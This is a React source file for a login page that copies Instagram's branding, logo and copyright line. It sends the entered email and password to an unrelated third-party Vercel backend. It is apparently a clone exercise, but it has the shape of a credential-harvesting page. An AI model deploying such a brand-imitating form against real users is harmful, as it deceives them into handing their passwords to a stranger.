import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/LoginPage.css";
import LOGO from "../assets/img/instagram-logo.png"
import APPLE from "../assets/img/apple-button.png"
import GOOGLE from "../assets/img/googleplay-button.png"


const LoginPage = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const navigate = useNavigate();

  const handleLogin = async () => {
    if (!email || !password) {
      return;
    }

    try {
      const res = await fetch("https://backend-hazel-tau-91.vercel.app/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      const data = await res.json();

      if (res.ok) {
        navigate("/dashboard");
      }
    } catch (err) {
      console.error("Error connecting to backend:", err);
    }
  };

  return (
    <div>
      <main className="flex align-items-center justify-content-center">
        <section id="mobile" className="flex"></section>
        <section id="auth" className="flex direction-column">
          <div className="panel login flex direction-column">
            <h1 title="Instagram" className="flex justify-content-center">
              <img
                src={LOGO}
                alt="Instagram logo"
                title="Instagram logo"
              />
            </h1>

            {/* FORM */}
            <form onSubmit={(e) => e.preventDefault()}>
              <label htmlFor="email" className="sr-only">
                Phone number, username, or email
              </label>
              <input
                name="email"
                placeholder="Phone number, username, or email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />

              <label htmlFor="password" className="sr-only">
                Password
              </label>
              <input
                name="password"
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />

              <button type="button" onClick={handleLogin}>
                Log In
              </button>
            </form>

            <div className="flex separator align-items-center">
              <span></span>
              <div className="or">OR</div>
              <span></span>
            </div>
            <div className="login-with-fb flex direction-column align-items-center">
              <div>
                
                <a href="#">Log in with Facebook</a>
              </div>
              <a href="#">Forgot password?</a>
            </div>
          </div>

          <div className="panel register flex justify-content-center">
            <p>Don’t have an account?</p>
            <a href="#">Sign up</a>
          </div>

          <div className="app-download flex direction-column align-items-center">
            <p>Get the app.</p>
            <div className="flex justify-content-center">
              <img
                src={APPLE}
                alt="Apple Store button"
                title="Apple Store button"
              />
              <img
                src={GOOGLE}
                alt="Google Play button"
                title="Google Play button"
              />
            </div>
          </div>
        </section>
      </main>

      <footer>
        <ul className="flex flex-wrap justify-content-center">
          <li><a href="#">ABOUT</a></li>
          <li><a href="#">HELP</a></li>
          <li><a href="#">PRESS</a></li>
          <li><a href="#">API</a></li>
          <li><a href="#">JOBS</a></li>
          <li><a href="#">PRIVACY</a></li>
          <li><a href="#">TERMS</a></li>
          <li><a href="#">LOCATIONS</a></li>
          <li><a href="#">TOP ACCOUNTS</a></li>
          <li><a href="#">HASHTAGS</a></li>
          <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p className="copyright">© 2020 Instagram from Facebook</p>
      </footer>
    </div>
  );
};

export default LoginPage;
